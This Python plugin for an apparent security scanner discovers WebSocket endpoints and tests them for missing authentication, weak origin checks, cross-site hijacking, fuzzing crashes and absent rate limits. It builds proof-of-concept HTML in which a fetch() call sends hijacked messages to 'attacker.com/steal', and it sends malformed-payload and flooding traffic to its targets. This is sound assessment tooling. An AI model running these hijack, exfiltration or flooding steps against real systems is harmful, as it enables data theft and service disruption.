# plugins/web/websocket_analyzer.py
import asyncio
import websockets
import json
import re
import time
import ssl
from urllib.parse import urlparse, urljoin
from collections import defaultdict
import base64
import hashlib

PRIORITY = 35
TYPE = "Web Analysis"
DESCRIPTION = "WebSocket protocol security testing and analysis"

class WebSocketAnalyzer:
    def __init__(self):
        # Common WebSocket endpoint patterns
        self.ws_patterns = [
            "/ws",
            "/websocket",
            "/socket.io",
            "/wss",
            "/socket",
            "/live",
            "/realtime",
            "/stream",
            "/push",
            "/events",
            "/updates",
            "/chat",
            "/notification"
        ]
        
        # WebSocket subprotocols
        self.common_protocols = [
            "chat",
            "soap",
            "wamp",
            "stomp",
            "mqtt",
            "amqp",
            "json",
            "binary"
        ]
        
        # Test messages for different protocols
        self.test_messages = {
            "generic": [
                '{"type": "ping"}',
                '{"event": "subscribe", "channel": "general"}',
                'Hello, server!',
                'PING',
                'GET / HTTP/1.1'
            ],
            "json": [
                '{"action": "auth", "token": "test"}',
                '{"method": "subscribe", "params": ["updates"]}',
                '{"id": 1, "method": "echo", "params": ["test"]}'
            ],
            "stomp": [
                'CONNECT\naccept-version:1.2\nhost:localhost\n\n\x00',
                'SUBSCRIBE\ndestination:/topic/general\nid:0\n\n\x00'
            ],
            "binary": [
                b'\x00\x01\x02\x03',  # Simple binary
                b'\x81\x05Hello',      # Text frame with mask
                b'\x82\x05World'       # Binary frame
            ]
        }
        
        # Security tests
        self.security_tests = [
            {
                "name": "Authentication Bypass",
                "description": "Test if WebSocket accepts connections without authentication",
                "test": self.test_auth_bypass
            },
            {
                "name": "Origin Validation",
                "description": "Test WebSocket origin validation",
                "test": self.test_origin_validation
            },
            {
                "name": "Cross-Site WebSocket Hijacking",
                "description": "Test for CSWSH vulnerabilities",
                "test": self.test_cswsh
            },
            {
                "name": "Message Fuzzing",
                "description": "Fuzz WebSocket with malformed messages",
                "test": self.test_message_fuzzing
            },
            {
                "name": "Protocol Negotiation",
                "description": "Test subprotocol negotiation",
                "test": self.test_protocol_negotiation
            },
            {
                "name": "Rate Limiting",
                "description": "Test for rate limiting on WebSocket",
                "test": self.test_rate_limiting
            },
            {
                "name": "Information Disclosure",
                "description": "Test for information disclosure in handshake",
                "test": self.test_info_disclosure
            }
        ]
    
    async def discover_websocket_endpoints(self, base_url, session):
        """Discover WebSocket endpoints on a target"""
        endpoints = []
        
        parsed = urlparse(base_url)
        scheme = "wss" if parsed.scheme == "https" else "ws"
        host = parsed.hostname
        
        for pattern in self.ws_patterns:
            # Try direct WebSocket connection
            ws_url = f"{scheme}://{host}{pattern}"
            
            try:
                # Test connection with short timeout
                async with websockets.connect(ws_url, timeout=3) as ws:
                    endpoints.append(ws_url)
                    await ws.close()
            except:
                pass
            
            # Also check for common variations
            variations = [
                f"{pattern}/",
                f"{pattern}/1",
                f"{pattern}/websocket",
                f"{pattern}?transport=websocket",
                f"/api{pattern}",
                f"/api/v1{pattern}"
            ]
            
            for variation in variations:
                ws_url = f"{scheme}://{host}{variation}"
                try:
                    async with websockets.connect(ws_url, timeout=3) as ws:
                        endpoints.append(ws_url)
                        await ws.close()
                except:
                    pass
        
        # Also check HTML for WebSocket connections
        try:
            response = session.get(base_url, timeout=5)
            if response.status_code == 200:
                # Look for WebSocket connections in JavaScript
                ws_patterns_js = [
                    r'new WebSocket\(["\']([^"\']+)["\']\)',
                    r'ws://[^\s"\']+',
                    r'wss://[^\s"\']+',
                    r'socket\.io[^}]+["\'][^"\']+["\']'
                ]
                
                for pattern in ws_patterns_js:
                    matches = re.findall(pattern, response.text)
                    for match in matches:
                        if isinstance(match, tuple):
                            ws_url = match[0]
                        else:
                            ws_url = match
                        
                        # Convert relative URLs to absolute
                        if ws_url.startswith('ws://') or ws_url.startswith('wss://'):
                            endpoints.append(ws_url)
                        else:
                            # Try to construct absolute URL
                            if ws_url.startswith('/'):
                                base_scheme = 'wss' if base_url.startswith('https') else 'ws'
                                ws_url = f"{base_scheme}://{host}{ws_url}"
                                endpoints.append(ws_url)
        except:
            pass
        
        return list(set(endpoints))
    
    async def test_auth_bypass(self, ws_url):
        """Test if WebSocket accepts connections without authentication"""
        results = {
            "test": "Authentication Bypass",
            "vulnerable": False,
            "details": "",
            "error": None
        }
        
        try:
            # Try to connect without any authentication headers
            async with websockets.connect(ws_url, timeout=5) as ws:
                results["details"] = "Connection successful without authentication"
                results["vulnerable"] = True
                
                # Try to send a simple message
                await ws.send("test")
                response = await asyncio.wait_for(ws.recv(), timeout=2)
                results["details"] += f" - Received response: {str(response)[:50]}"
                
                await ws.close()
        except websockets.exceptions.InvalidStatusCode as e:
            if e.status_code == 401 or e.status_code == 403:
                results["details"] = f"Authentication required (HTTP {e.status_code})"
            else:
                results["details"] = f"Unexpected status code: {e.status_code}"
        except Exception as e:
            results["error"] = str(e)
            results["details"] = "Connection failed"
        
        return results
    
    async def test_origin_validation(self, ws_url):
        """Test WebSocket origin validation"""
        results = {
            "test": "Origin Validation",
            "vulnerable": False,
            "details": "",
            "error": None
        }
        
        # Test with different origins
        test_origins = [
            "http://evil.com",
            "null",
            "https://attacker.com",
            "http://localhost",
            "file://"
        ]
        
        for origin in test_origins[:3]:  # Test first 3
            try:
                headers = {"Origin": origin}
                async with websockets.connect(ws_url, extra_headers=headers, timeout=5) as ws:
                    results["vulnerable"] = True
                    results["details"] = f"Accepted connection from origin: {origin}"
                    await ws.close()
                    break
            except websockets.exceptions.InvalidStatusCode as e:
                if e.status_code == 403:
                    results["details"] = "Origin validation appears to be working"
                else:
                    results["details"] = f"Origin {origin} rejected with status {e.status_code}"
            except Exception as e:
                if "403" in str(e):
                    continue  # Expected rejection
                results["error"] = str(e)
        
        return results
    
    async def test_cswsh(self, ws_url):
        """Test for Cross-Site WebSocket Hijacking"""
        results = {
            "test": "Cross-Site WebSocket Hijacking",
            "vulnerable": False,
            "details": "",
            "error": None,
            "poc_html": ""
        }
        
        try:
            # First, establish a normal WebSocket connection
            async with websockets.connect(ws_url, timeout=5) as ws:
                # Send a message that might return sensitive data
                test_messages = [
                    '{"type": "get_user_info"}',
                    '{"action": "whoami"}',
                    'GET /user/profile HTTP/1.1'
                ]
                
                for msg in test_messages:
                    try:
                        await ws.send(msg)
                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        
                        # Check if response contains sensitive information
                        sensitive_patterns = [
                            r'email[":\s]+([^"\s]+)',
                            r'token[":\s]+([^"\s]+)',
                            r'password[":\s]+([^"\s]+)',
                            r'user[":\s]*{([^}]+)}',
                            r'id[":\s]+([^"\s,]+)'
                        ]
                        
                        response_str = str(response)
                        for pattern in sensitive_patterns:
                            if re.search(pattern, response_str, re.IGNORECASE):
                                results["vulnerable"] = True
                                results["details"] = f"Sensitive data returned: {pattern}"
                                
                                # Generate PoC HTML
                                parsed = urlparse(ws_url)
                                results["poc_html"] = self.generate_cswsh_poc(ws_url, parsed.hostname)
                                break
                        
                        if results["vulnerable"]:
                            break
                            
                    except asyncio.TimeoutError:
                        continue
                
                await ws.close()
                
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def generate_cswsh_poc(self, ws_url, host):
        """Generate CSWSH proof-of-concept HTML"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CSWSH Test - {host}</title>
</head>
<body>
    <h1>Cross-Site WebSocket Hijacking Test</h1>
    <div id="output"></div>
    
    <script>
        // WebSocket connection to target
        const ws = new WebSocket('{ws_url}');
        
        ws.onopen = function() {{
            document.getElementById('output').innerHTML += '<p>✓ WebSocket connected</p>';
            
            // Send test messages
            ws.send('{{"action": "whoami"}}');
            ws.send('{{"type": "get_user_info"}}');
        }};
        
        ws.onmessage = function(event) {{
            document.getElementById('output').innerHTML += 
                '<p>📨 Received: ' + event.data + '</p>';
            
            // Try to exfiltrate data
            fetch('https://attacker.com/steal', {{
                method: 'POST',
                body: JSON.stringify({{data: event.data, origin: '{ws_url}'}})
            }});
        }};
        
        ws.onerror = function(error) {{
            document.getElementById('output').innerHTML += 
                '<p>❌ Error: ' + error + '</p>';
        }};
    </script>
</body>
</html>"""
    
    async def test_message_fuzzing(self, ws_url):
        """Fuzz WebSocket with malformed messages"""
        results = {
            "test": "Message Fuzzing",
            "vulnerable": False,
            "details": "",
            "error": None,
            "crashes": []
        }
        
        fuzz_payloads = [
            # Very long messages
            "A" * 10000,
            "B" * 50000,
            
            # Special characters
            "\x00\x01\x02\x03\x04\x05",
            "\xff\xfe\xfd\xfc",
            
            # JSON bombs
            '{"a":' + '[' * 1000 + '1' + ']' * 1000 + '}',
            
            # Array bombs
            '[' * 1000 + '1' + ']' * 1000,
            
            # Nested objects
            '{"a":' * 100 + '1' + '}' * 100,
            
            # Binary data in text frame
            b'\x00\x01\x02\x03\x04\x05'.decode('latin-1'),
            
            # Unicode weirdness
            '\u0000\u202e\u202d',
            '🐍' * 1000,
            
            # Protocol confusion
            'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n',
            'POST /api HTTP/1.1\r\nContent-Length: 1000\r\n\r\n' + 'A' * 1000
        ]
        
        try:
            async with websockets.connect(ws_url, timeout=10) as ws:
                for i, payload in enumerate(fuzz_payloads[:10]):  # Limit to 10
                    try:
                        await ws.send(payload)
                        
                        # Wait for response
                        try:
                            response = await asyncio.wait_for(ws.recv(), timeout=2)
                            # Check if response indicates error
                            if "error" in str(response).lower() or "invalid" in str(response).lower():
                                results["crashes"].append({
                                    "payload": str(payload)[:50],
                                    "response": str(response)[:100]
                                })
                        except asyncio.TimeoutError:
                            # No response - might have crashed
                            results["crashes"].append({
                                "payload": str(payload)[:50],
                                "response": "Timeout - possible crash"
                            })
                        
                        # Small delay between messages
                        await asyncio.sleep(0.1)
                        
                    except websockets.exceptions.ConnectionClosed:
                        results["vulnerable"] = True
                        results["crashes"].append({
                            "payload": str(payload)[:50],
                            "response": "Connection closed"
                        })
                        break
                    except Exception as e:
                        results["crashes"].append({
                            "payload": str(payload)[:50],
                            "error": str(e)
                        })
                
                await ws.close()
                
        except Exception as e:
            results["error"] = str(e)
        
        if results["crashes"]:
            results["vulnerable"] = True
            results["details"] = f"{len(results['crashes'])} crashes/failures detected"
        
        return results
    
    async def test_protocol_negotiation(self, ws_url):
        """Test WebSocket subprotocol negotiation"""
        results = {
            "test": "Protocol Negotiation",
            "vulnerable": False,
            "details": "",
            "error": None,
            "accepted_protocols": []
        }
        
        # Test with different subprotocols
        for protocol in self.common_protocols:
            try:
                async with websockets.connect(
                    ws_url, 
                    subprotocols=[protocol],
                    timeout=5
                ) as ws:
                    # Check if protocol was accepted
                    if ws.subprotocol == protocol:
                        results["accepted_protocols"].append(protocol)
                        results["details"] = f"Accepted protocol: {protocol}"
                    
                    await ws.close()
                    
            except Exception as e:
                # Protocol not accepted
                pass
        
        # Test with multiple protocols
        try:
            async with websockets.connect(
                ws_url,
                subprotocols=["soap", "wamp", "stomp"],
                timeout=5
            ) as ws:
                if ws.subprotocol:
                    results["accepted_protocols"].append(ws.subprotocol)
                    results["details"] = f"Negotiated protocol: {ws.subprotocol}"
                
                await ws.close()
                
        except Exception as e:
            pass
        
        if results["accepted_protocols"]:
            results["vulnerable"] = True  # In the sense that it reveals protocol support
        
        return results
    
    async def test_rate_limiting(self, ws_url):
        """Test for rate limiting on WebSocket"""
        results = {
            "test": "Rate Limiting",
            "vulnerable": False,
            "details": "",
            "error": None,
            "messages_per_second": 0
        }
        
        try:
            async with websockets.connect(ws_url, timeout=5) as ws:
                messages_sent = 0
                start_time = time.time()
                
                # Send messages as fast as possible
                while time.time() - start_time < 3:  # Test for 3 seconds
                    try:
                        await ws.send(f"test_{messages_sent}")
                        messages_sent += 1
                        
                        # Try to receive without waiting
                        try:
                            await asyncio.wait_for(ws.recv(), timeout=0.01)
                        except:
                            pass
                            
                    except websockets.exceptions.ConnectionClosed:
                        results["vulnerable"] = True
                        results["details"] = f"Connection closed after {messages_sent} messages"
                        break
                    except Exception:
                        break
                
                elapsed = time.time() - start_time
                if elapsed > 0:
                    mps = messages_sent / elapsed
                    results["messages_per_second"] = mps
                    
                    if mps > 100:  # High message rate without limits
                        results["vulnerable"] = True
                        results["details"] = f"High message rate possible: {mps:.1f} msg/sec"
                    else:
                        results["details"] = f"Message rate: {mps:.1f} msg/sec"
                
                await ws.close()
                
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    async def test_info_disclosure(self, ws_url):
        """Test for information disclosure in WebSocket handshake"""
        results = {
            "test": "Information Disclosure",
            "vulnerable": False,
            "details": "",
            "error": None,
            "headers": {}
        }
        
        try:
            # Connect and examine handshake
            async with websockets.connect(ws_url, timeout=5) as ws:
                # Get response headers (websockets library doesn't expose them directly)
                # We'll simulate by making a separate HTTP request for the upgrade
                import aiohttp
                
                parsed = urlparse(ws_url)
                http_url = f"http{'s' if parsed.scheme == 'wss' else ''}://{parsed.netloc}{parsed.path}"
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(http_url, headers={
                        "Upgrade": "websocket",
                        "Connection": "Upgrade",
                        "Sec-WebSocket-Key": base64.b64encode(b"test").decode(),
                        "Sec-WebSocket-Version": "13"
                    }) as response:
                        
                        # Check headers for information disclosure
                        sensitive_headers = [
                            "Server",
                            "X-Powered-By",
                            "X-AspNet-Version",
                            "X-Runtime",
                            "X-Version",
                            "X-Backend-Server"
                        ]
                        
                        for header in sensitive_headers:
                            if header in response.headers:
                                results["headers"][header] = response.headers[header]
                                results["vulnerable"] = True
                        
                        if results["headers"]:
                            results["details"] = f"Found headers: {', '.join(results['headers'].keys())}"
                        else:
                            results["details"] = "No sensitive headers found"
                
                await ws.close()
                
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    async def analyze_single_target(self, base_url, session):
        """Complete analysis of a single target"""
        print(f"    ┃   ├ Testing: {base_url}")
        
        results = {
            "url": base_url,
            "websocket_endpoints": [],
            "security_tests": {},
            "vulnerabilities": [],
            "error": None
        }
        
        try:
            # Discover WebSocket endpoints
            endpoints = await self.discover_websocket_endpoints(base_url, session)
            results["websocket_endpoints"] = endpoints
            
            if not endpoints:
                print(f"    ┃   │   └ No WebSocket endpoints found")
                return results
            
            print(f"    ┃   │   ├ Found {len(endpoints)} WebSocket endpoint(s)")
            
            # Test first endpoint (most common)
            endpoint = endpoints[0]
            
            # Run security tests
            for test in self.security_tests:
                print(f"    ┃   │   ├ {test['name']}")
                
                test_result = await test["test"](endpoint)
                results["security_tests"][test["name"]] = test_result
                
                if test_result.get("vulnerable"):
                    results["vulnerabilities"].append({
                        "test": test["name"],
                        "details": test_result.get("details", ""),
                        "endpoint": endpoint
                    })
                    
                    if test["name"] == "Cross-Site WebSocket Hijacking":
                        print(f"    ┃   │   │   └ CRITICAL: CSWSH vulnerability!")
                    else:
                        print(f"    ┃   │   │   └ VULNERABLE: {test_result['details'][:50]}")
                else:
                    print(f"    ┃   │   │   └ Secure")
            
        except Exception as e:
            results["error"] = str(e)
            print(f"    ┃   │   └ Error: {str(e)[:50]}")
        
        return results

async def run_async_analysis(kb, targets):
    """Async wrapper for WebSocket analysis"""
    analyzer = WebSocketAnalyzer()
    all_results = []
    
    for target in targets:
        import requests
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        
        result = await analyzer.analyze_single_target(target, session)
        all_results.append(result)
    
    return all_results

def run(kb):
    """Plugin entry point"""
    print(f"\n[*] Running {DESCRIPTION}...")
    
    # Get targets from KnowledgeBase
    targets = []
    
    # Get from web servers
    web_analysis = kb.get("web_logic_analysis", {})
    if web_analysis and "results" in web_analysis:
        for result in web_analysis["results"]:
            if result.get("status_code") == 200:
                # Get base URL
                parsed = urlparse(result["target"])
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                if base_url not in targets:
                    targets.append(base_url)
    
    # Get from advanced crawl
    advanced_crawl = kb.get("advanced_crawl", {})
    if advanced_crawl and "pages" in advanced_crawl:
        for page in advanced_crawl["pages"][:10]:
            parsed = urlparse(page["url"])
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            if base_url not in targets:
                targets.append(base_url)
    
    targets = list(set(targets))
    
    if not targets:
        print("    ╚ No targets found for WebSocket analysis")
        return
    
    print(f"    ╠ Targets to test: {len(targets)}")
    
    # Run async analysis
    import asyncio
    
    try:
        # Create new event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        all_results = loop.run_until_complete(
            run_async_analysis(kb, targets[:3])  # Limit to 3 due to time
        )
        
        # Process results
        ws_found = sum(len(r["websocket_endpoints"]) for r in all_results)
        vulnerabilities = sum(len(r["vulnerabilities"]) for r in all_results)
        critical_vulns = sum(1 for r in all_results 
                           for v in r.get("vulnerabilities", []) 
                           if "CSWSH" in v.get("test", ""))
        
        # Save to KnowledgeBase
        summary = {
            "total_targets": len(all_results),
            "websocket_endpoints_found": ws_found,
            "vulnerabilities_found": vulnerabilities,
            "critical_vulnerabilities": critical_vulns,
            "results": all_results
        }
        
        kb.update("websocket_analysis", summary)
        
        # Generate report
        print(f"\n    ╔═══════════════════════════════════════════════")
        print(f"    ║ WEBSOCKET SECURITY ANALYSIS COMPLETE")
        print(f"    ║ Targets analyzed: {len(all_results)}")
        print(f"    ║ WebSocket endpoints found: {ws_found}")
        print(f"    ║ Security vulnerabilities: {vulnerabilities}")
        print(f"    ║ Critical vulnerabilities: {critical_vulns}")
        
        if vulnerabilities > 0:
            print(f"    ║")
            print(f"    ║ VULNERABLE TARGETS:")
            
            for result in all_results:
                if result["vulnerabilities"]:
                    print(f"    ║   • {result['url']}")
                    
                    for vuln in result["vulnerabilities"][:2]:
                        severity = "CRITICAL" if "CSWSH" in vuln["test"] else "MEDIUM"
                        print(f"    ║     [{severity}] {vuln['test']}: {vuln['details'][:60]}")
        
        if critical_vulns > 0:
            print(f"    ║")
            print(f"    ║ ⚠️  CRITICAL SECURITY WARNING")
            print(f"    ║ Cross-Site WebSocket Hijacking detected!")
            print(f"    ║ This allows attackers to hijack WebSocket connections")
            print(f"    ║ and steal sensitive data via malicious websites.")
            
            # Add to security alerts
            current_alerts = kb.get("security_alerts", {})
            current_alerts["websocket_hijacking"] = {
                "status": "CRITICAL",
                "vulnerable_targets": critical_vulns,
                "details": "Cross-Site WebSocket Hijacking allows attackers to establish WebSocket connections from malicious sites and access sensitive data."
            }
            kb.update("security_alerts", current_alerts)
        
        print(f"    ╚═══════════════════════════════════════════════")
        
    except Exception as e:
        print(f"    ╚ Error during WebSocket analysis: {str(e)}")
